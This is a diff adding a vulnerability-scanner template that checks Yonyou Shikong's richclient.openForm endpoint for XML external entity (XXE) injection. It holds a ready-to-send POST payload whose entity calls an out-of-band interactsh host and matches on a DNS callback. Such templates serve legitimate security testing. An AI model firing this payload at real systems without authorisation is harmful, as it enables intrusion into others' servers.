@@ -1,0 +1,23 @@
+id: yongyoushikong-richclient_openForm-XXE
+
+info:
+  name: 用友时空 richclient.openForm XXE漏洞
+  author: yongyoushikong
+  severity: high
+  tags: XXE
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=richclient.openForm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/Xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+        <root/>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
